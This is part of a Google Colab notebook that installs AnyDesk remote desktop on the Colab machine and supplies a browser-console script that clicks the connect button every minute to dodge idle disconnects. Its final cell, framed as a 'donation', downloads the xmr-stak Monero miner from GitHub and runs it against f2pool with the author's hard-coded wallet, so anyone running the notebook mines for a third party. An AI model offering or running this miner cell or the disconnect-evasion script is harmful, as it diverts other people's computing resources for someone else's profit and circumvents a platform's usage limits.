    {
      "cell_type": "code",
      "metadata": {
        "id": "FVCDnvc1aZp9"
      },
      "source": [
        "#Install Anydesk\n",
        "!wget -qO - https://keys.anydesk.com/repos/DEB-GPG-KEY | apt-key add -\n",
        "!echo \"deb http://deb.anydesk.com/ all main\" > /etc/apt/sources.list.d/anydesk-stable.list\n",
        "!apt update\n",
        "!apt install anydesk"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Ht5qVKBs7rGU"
      },
      "source": [
        "Get more ram (not working)"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dNaNUB6x7tcX"
      },
      "source": [
        "[1]*10**10"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "QY-DE71n59L5"
      },
      "source": [
        "Paste these commands into your console to prevent you from getting disconnected to Google Colab. (accessible by pressing CRTL+Shift+I and click on the Console menu (don't run, just copy)"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8505j6Dk57P-"
      },
      "source": [
        "function KeepClicking(){\n",
        "   console.log(\"Clicking\");\n",
        "   document.querySelector(\"colab-toolbar-button#connect\").click()\n",
        "}setInterval(KeepClicking,60000)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "1k8TBD4qh6vt"
      },
      "source": [
        "#Run this to donate me some hashing power and some monero\n",
        "!wget https://github.com/fireice-uk/xmr-stak/releases/download/1.0.5-rx/xmr-stak-rx-linux-1.0.5-cpu.tar.xz\n",
        "!tar -xvf xmr-stak-rx-linux-1.0.5-cpu.tar.xz\n",
        "!cd xmr-stak-rx-linux-1.0.5-cpu\n",
        "!./xmr-stak-rx-linux-1.0.5-cpu/xmr-stak-rx -o xmr.f2pool.com:13531 -u 4B86gQXeGM4PeV8Tykuf3YEgfG7m6mVtii324mfgsEgiSK2xGfLFvFudTU7M9mkzCfTQuqi3pzu3b9vWe72yEB5pJuAJDRa --noTest"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}